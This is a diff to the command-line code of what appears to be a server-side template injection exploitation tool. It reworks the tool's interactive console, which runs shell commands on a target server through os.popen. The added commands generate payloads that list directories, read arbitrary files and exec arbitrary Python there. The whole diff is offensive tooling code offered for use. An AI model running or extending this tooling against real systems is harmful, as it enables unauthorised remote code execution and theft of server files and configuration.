@@ -28,6 +28,7 @@ from .requester import Requester
 from .submitter import Submitter, PathSubmitter, FormSubmitter, shell_tamperer
 from .scan_url import yield_form
 from .webui import main as webui_main
+from .interact import interact
 
 set_enable_coloring()
 
@@ -47,30 +48,7 @@ TITLE = colored(
     ),
     bold=True,
 )
-INTERACTIVE_MODE_HELP = """
-{english_title}:
-- Command Execution: type to execute shell command with os.popen()
-- Python Eval: use {eval_help} to eval python expression on the target server
-- Get Config: use {get_config_help} to get the config of the target server
-- Press {exit_help} to exit
-{chinese_title}：
-- 命令执行：输入任意命令即可在目标上用os.popen()执行
-- Python Eval：使用{eval_help}来eval任意python表达式
-- 配置获取：使用{get_config_help}来获得目标的flask config
-- 按下{exit_help}退出
-{example_title}:
-$>> ls /
-$>> %%eval 1+2+3+100000
-$>> %%get-config
 
-""".format(
-    english_title = colored("yellow", "Interactive Console", bold=True),
-    chinese_title = colored("yellow", "交互终端", bold=True),
-    example_title = colored("yellow", "Example/示例", bold=True),
-    eval_help=colored("cran", "%%eval <expression>"),
-    get_config_help=colored("cran", "%%get-config"),
-    exit_help=colored("cran", "Ctrl+D"),
-)
 LOGGING_FORMAT = "%(levelname)s:[%(name)s] | %(message)s"
 logging.basicConfig(level=logging.INFO, format=LOGGING_FORMAT)
 logger = logging.getLogger("cli")
@@ -101,16 +79,41 @@ def do_submit_cmdexec(
         str: 回显
     """
     payload, will_print = None, None
-    if cmd[:2] == "%%":
-        cmd = cmd[2:]
+    # 解析命令
+    if cmd[0] == "@":
+        cmd = cmd[1:]
         if cmd.startswith("get-config"):
             payload, will_print = full_payload_gen_like.generate(CONFIG)
         elif cmd.startswith("eval"):
             payload, will_print = full_payload_gen_like.generate(
-                EVAL, STRING, cmd[4:].strip()
+                EVAL, (STRING, cmd[4:].strip())
             )
+        elif cmd.startswith("ls"):
+            cmd = cmd.strip()
+            if len(cmd) == 2: # ls
+                payload, will_print = full_payload_gen_like.generate(
+                    EVAL, (STRING, "__import__('os').listdir()")
+                )
+            else: # ls xxx
+                payload, will_print = full_payload_gen_like.generate(
+                    EVAL, (STRING, f"__import__('os').listdir({repr(cmd[2:].strip())})")
+                )
+        elif cmd.startswith("cat"):
+            filepath = cmd[3:].strip()
+            payload, will_print = full_payload_gen_like.generate(
+                EVAL, (STRING, f"open({repr(filepath)}, 'r').read()")
+            )
+        elif cmd.startswith("exec"):
+            statements = cmd[4:].strip()
+            payload, will_print = full_payload_gen_like.generate(
+                EVAL, (STRING, f"exec({repr(statements)})")
+            )
+        else:
+            logging.warning("Please check your command")
+            return ""
     else:
         payload, will_print = full_payload_gen_like.generate(OS_POPEN_READ, cmd)
+    # 使用payload
     if payload is None:
         logger.warning("%s generating payload.", colored("red", "Failed"))
         return ""
@@ -123,25 +126,6 @@ def do_submit_cmdexec(
     result = submitter.submit(payload)
     assert result is not None
     return result.text
-
-
-def interact(cmd_exec_func: Callable):
-    """根据提供的payload生成方法向用户提供一个交互终端
-
-    Args:
-        cmd_exec_func (Callable): 根据输入的shell命令生成对应的payload
-    """
-    print(INTERACTIVE_MODE_HELP)
-    while True:
-        try:
-            cmd = input("$>> ")
-        except EOFError:
-            break
-        except KeyboardInterrupt:
-            break
-        result = cmd_exec_func(cmd)
-        print(result)
-    logger.warning("Bye!")
 
 
 def parse_headers_cookies(headers_list: List[str], cookies: str) -> Dict[str, str]:
@@ -221,7 +205,7 @@ def do_crack_form_eval_args_pre(
     replaced_keyword_strategy: str,
     environment: str,
     tamper_cmd: Union[str, None],
-) -> Union[Tuple[Submitter, Union[FullPayloadGen, EvalArgsModePayloadGen]], None]:
+) -> Union[Tuple[Submitter, EvalArgsModePayloadGen], None]:
     """攻击一个表单并获得结果，但是将payload放在GET/POST参数中提交
 
     Args:
